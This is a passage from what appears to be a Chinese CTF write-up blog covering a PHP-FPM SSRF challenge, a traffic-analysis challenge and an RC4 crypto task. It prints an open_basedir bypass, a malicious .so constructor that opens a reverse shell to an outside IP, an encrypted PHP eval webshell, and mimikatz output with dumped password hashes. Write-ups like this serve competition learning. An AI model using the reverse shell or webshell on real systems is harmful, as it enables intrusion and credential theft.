class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-comment">// normal files</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;__toString();<br>&#125;<br><span class="hljs-comment">// special files (starting with a dot(.))</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///.*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;__toString();<br>&#125;<br>sort(<span class="hljs-variable">$file_list</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$file_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure></li></ul><p>结果如下<br><img src="https://img-blog.csdnimg.cn/20210603151756833.png" alt="在这里插入图片描述"><br>在根目录里发现了 flag。</p><p>尝试使用 file_get_contents() 等函数读取均失败，猜测是出题人对flag的权限做了限制。那我们就要想办法提权了，但是要提权则必须先拿到 Shell 执行命令，也就是得要先绕过 disable_functions。</p><p>读取/proc/self/cmdline发现进程时php-fpm: pool www。猜测应该是攻击php-fpm来绕过disable_functions。则先读取nginx配置文件/etc/nginx/nginx.conf发现有发现有</p><blockquote><p>include /etc/nginx/sites-enabled/*</p><ul><li>sites_availables 指的是所有 nginx 站点；</li><li>sites_enabled 指的是当前开启的 nginx 站点；</li></ul></blockquote><p>再接着读/etc/nginx/sites-enabled/default，发现</p><p><img src="https://img-blog.csdnimg.cn/20210603152428650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>发现 PHP-FPM 绑定在了本地 9001 端口上。</p><p>好了，既然我们可以通过 eval() 执行任意代码，那我们便可以构造恶意代码进行 SSRF，利用 SSRF 攻击本地的 PHP-FPM。但是由于这里禁用了许多函数和类，像那些普通能构成 SSRF 的函数和类都无法使用，但是 FTP 协议未被禁用。</p><p>我们可以通过在 VPS上搭建恶意的FTP服务器，骗取目标主机将 Payload 重定向到自己的 9001 端口上，从而实现攻击 PHP-FPM 并执行命令。</p><p>这里利用了 FTP 协议工作方式中的被动方式，在该方式中，FTP 客户端和服务端在建立控制通道的时候用二者的TCP 21端口建立连接，建立连接后发送 PASV 命令。FTP 服务器收到 PASV 命令后，随机打开一个高端端口（端口号大于1024）并且通知客户端在这个端口上传送数据的请求，客户端连接到 FTP 服务器的此高端端口，通过三次握手建立通道，然后FTP服务器将通过这个端口进行数据的传送。</p><p>首先尝试使用 Gopherus 生成的攻击 PHP-FPM 的 Payload 失败，然后尝试通过加载恶意 .so 扩展的方式。网上的脚本.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br>__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">preload</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&#x27;&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p><a href="https://err0r.top/article/bluehat2021/">https://err0r.top/article/bluehat2021/</a><br><a href="http://bubb1e.com/2021/04/29/%E8%93%9D%E5%B8%BD%E6%9D%AF2021WP_WEB/#0x02-one-Pointer-php">http://bubb1e.com/2021/04/29/%E8%93%9D%E5%B8%BD%E6%9D%AF2021WP_WEB/#0x02-one-Pointer-php</a><br><a href="https://www.anquanke.com/post/id/233454">https://www.anquanke.com/post/id/233454</a><br><a href="https://xz.aliyun.com/t/9544#toc-6">https://xz.aliyun.com/t/9544#toc-6</a><br><a href="https://www.infoq.cn/article/vIcwtItzVK7B4YNOEj3e">https://www.infoq.cn/article/vIcwtItzVK7B4YNOEj3e</a></p>]]></content>
    
    
    <categories>
      
      <category>ssrf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TSCTFWP</title>
    <link href="/2021/05/24/2020-5-24-TSCTFWP/"/>
    <url>/2021/05/24/2020-5-24-TSCTFWP/</url>
    
    <content type="html"><![CDATA[<p>问卷就不说了</p><h1 id="Ohmypassword"><a href="#Ohmypassword" class="headerlink" title="Ohmypassword"></a>Ohmypassword</h1><p>进入流量包 过滤出来</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">http contains &quot;password“<br></code></pre></div></td></tr></table></figure><p>即可看到</p><p><img src="https://img-blog.csdnimg.cn/20210524131625628.png" alt="在这里插入图片描述"></p><p>追踪第一个流量包即可发现在最后一部分上传了一个php文件</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$key</span>=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$key</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br><span class="hljs-variable">$post</span>=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=openssl_decrypt(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=explode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>@<span class="hljs-keyword">new</span> C(<span class="hljs-variable">$params</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>很容易分析出来用pass传参生成了一个key，然后php://input协议获取post流中的内容，可以返现这个key是用来AES解密的，之后很容易想到过滤出pass关键字<br><img src="https://img-blog.csdnimg.cn/20210524131859997.png" alt="在这里插入图片描述"><br>用最后出传入的pass值生成的key，追踪流即可发现生成的key</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">key</span> = <span class="hljs-number">09</span>f<span class="hljs-number">2</span>d<span class="hljs-number">96615775182</span><br></code></pre></div></td></tr></table></figure><p>有了key就可以对post流中的数据流进行解密，脚本如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// $key=substr(md5(uniqid(rand())),16);</span><br><span class="hljs-comment">// echo $key;</span><br><span class="hljs-variable">$post</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;09f2d96615775182&quot;</span>;<br><span class="hljs-comment">#$key = &quot;dadc0b42da0fd57d&quot;;</span><br><span class="hljs-variable">$post</span>=openssl_decrypt(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$post</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>$post即为post流中的内容,也可以使服务器响应返回的内容。接下来就是对找对流量包。这个过程很艰难，因为流量包太多了。最后过滤出http协议在后面一部分找到了对的流量包。第一个在3682的流量包,解密如下</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada"><span class="hljs-keyword">type</span> <span class="hljs-type">password1.txt</span><br><span class="hljs-type"></span><br><span class="hljs-type">  </span>.#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> Sep <span class="hljs-number">18</span> <span class="hljs-number">2020</span> <span class="hljs-number">19</span>:<span class="hljs-number">18</span>:<span class="hljs-number">29</span><br> .## ^ ##.  <span class="hljs-string">&quot;A La Vie, A L&#x27;Amour&quot;</span> - (oe.eo)<br> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz<br> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )<br>  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/<br><br>mimikatz(commandline) # privilege::debug<br>Privilege &#x27;<span class="hljs-number">20</span>&#x27; OK<br><br>mimikatz(commandline) # sekurlsa::logonpasswords<br><br>Authentication Id : 0 ; <span class="hljs-number">666554</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000</span>a2bba)<br>Session           : <span class="hljs-type">Interactive</span> from <span class="hljs-number">1</span><br>User Name         : 23333<br>Domain            : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Server      : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Time        : 2021/5/3 16:11:10<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1594512008</span>-<span class="hljs-number">2047613387</span>-<span class="hljs-number">837257493</span>-<span class="hljs-number">1000</span><br>msv :<br> [<span class="hljs-number">00000003</span>] Primary<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * LM       : 5<span class="hljs-type">c651cac55ccdc3cd210ce269f6f8d13</span><br> * NTLM     : 922<span class="hljs-type">ce1a39b00c1d9d929dfd31d9f2c1f</span><br> * SHA1     : 7<span class="hljs-type">a6fdaedc33598705c1690da021bb69d0aaef9c0</span><br>tspkg :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>wdigest :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>kerberos :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">666412</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000</span>a2b2c)<br>Session           : <span class="hljs-type">Interactive</span> from <span class="hljs-number">1</span><br>User Name         : 23333<br>Domain            : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Server      : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Time        : 2021/5/3 16:11:10<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1594512008</span>-<span class="hljs-number">2047613387</span>-<span class="hljs-number">837257493</span>-<span class="hljs-number">1000</span><br>msv :<br> [<span class="hljs-number">00000003</span>] Primary<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * LM       : 5<span class="hljs-type">c651cac55ccdc3cd210ce269f6f8d13</span><br> * NTLM     : 922<span class="hljs-type">ce1a39b00c1d9d929dfd31d9f2c1f</span><br> * SHA1     : 7<span class="hljs-type">a6fdaedc33598705c1690da021bb69d0aaef9c0</span><br>tspkg :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>wdigest :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>kerberos :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">997</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e5</span>)<br>Session           : <span class="hljs-type">Service</span> from <span class="hljs-number">0</span><br>User Name         : <span class="hljs-type">LOCAL</span> SERVICE<br>Domain            : <span class="hljs-type">NT</span> AUTHORITY<br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:57<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">19</span><br>msv :<br>tspkg :<br>wdigest :<br> * Username : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Domain   : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>kerberos :<br> * Username : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Domain   : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">996</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e4</span>)<br>Session           : <span class="hljs-type">Service</span> from <span class="hljs-number">0</span><br>User Name         : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br>Domain            : <span class="hljs-type">WORKGROUP</span><br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:57<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">20</span><br>msv :<br>tspkg :<br>wdigest :<br> * Username : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>kerberos :<br> * Username : <span class="hljs-type">win</span>-ovth665jqc3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">48274</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0000</span>bc92)<br>Session           : <span class="hljs-type">UndefinedLogonType</span> from <span class="hljs-number">0</span><br>User Name         : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Domain            : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:56<br>SID               : <br>msv :<br>tspkg :<br>wdigest :<br>kerberos :<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">999</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e7</span>)<br>Session           : <span class="hljs-type">UndefinedLogonType</span> from <span class="hljs-number">0</span><br>User Name         : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br>Domain            : <span class="hljs-type">WORKGROUP</span><br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:56<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">18</span><br>msv :<br>tspkg :<br>wdigest :<br> * Username : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>kerberos :<br> * Username : <span class="hljs-type">win</span>-ovth665jqc3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>ssp :<br>credman :<br><br>mimikatz(commandline) # <span class="hljs-keyword">exit</span><br>Bye!<br><br>C:\phpstudy_pro\WWW\TEST\hackable\uploads&gt;<br></code></pre></div></td></tr></table></figure><p>第二个流量包位置忘记了，解密后的内容如下</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">23333</span> HACKING_TO_THE_GATE<br>命令成功完成。<br></code></pre></div></td></tr></table></figure><p>由此可得出flag:TSCTF{EL_PSY_CONGROO_HACKING_TO_THE_GATE}</p><h1 id="HelloRc4"><a href="#HelloRc4" class="headerlink" title="HelloRc4"></a>HelloRc4</h1><p>这题看懂了源码就着实很简单。分析一下源码可以知道。先进行了一个sha256验证，直接拿脚本跑就行了，然后进入到MyPrng类中在下面这个代码，</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyPrng</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span> <span class="hljs-comment">#创建临时向量T（256位）</span><br>        self.state  = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]<br>        self.i      = <span class="hljs-number">0</span><br>        self.j      = <span class="hljs-number">0</span><br>        self.k      = <span class="hljs-number">0</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__swap_state</span>(<span class="hljs-params">self, a, b</span>):</span><br>        self.state[a], self.state[b] = self.state[b], self.state[a]  <span class="hljs-comment">#每产生一个字节k，S的元素都要被再次排列</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ksa</span>(<span class="hljs-params">self, key</span>):</span><br>        j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            j = (j + self.state[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>            <span class="hljs-built_in">list</span>.append([i,j])<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>                <span class="hljs-keyword">if</span>(p[<span class="hljs-number">0</span>]==j <span class="hljs-keyword">and</span> p[<span class="hljs-number">1</span>]==i):<br>                    <span class="hljs-built_in">print</span>(p[<span class="hljs-number">0</span>],p[<span class="hljs-number">1</span>],i,j,<span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]))<br>            self.__swap_state(i, j) <span class="hljs-comment">#交换元素</span><br>        k = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            k = (k - self.state[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>            self.__swap_state(i, k) <span class="hljs-comment">#交换元素</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prng</span>(<span class="hljs-params">self</span>):</span>  <span class="hljs-comment">#产生密钥字节k</span><br>        self.i = (self.i + <span class="hljs-number">1</span>)                   % <span class="hljs-number">256</span><br>        self.j = (self.j + self.state[self.i])  % <span class="hljs-number">256</span><br>        self.k = (self.k + self.state[self.j])  % <span class="hljs-number">256</span><br>        self.__swap_state(self.i, self.j)<br>        self.__swap_state(self.i, self.k)<br><br>        <span class="hljs-keyword">return</span> self.state[(self.state[self.i] + self.state[self.j] + self.state[self.k]) % <span class="hljs-number">256</span>]<br><br></code></pre></div></td></tr></table></figure><p>我增加了一些注释，再百度一下Rc4原理其实就能看懂。之后看main函数可以发现要求输入key1和key2两个初始密钥，之后利用密钥对同一个明文进行加密，如果两个加密后的密文相同即可输出flag，首先看看key的作用在哪。可以发现key的作用很单一。<br><img src="https://img-blog.csdnimg.cn/2021052413463085.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" 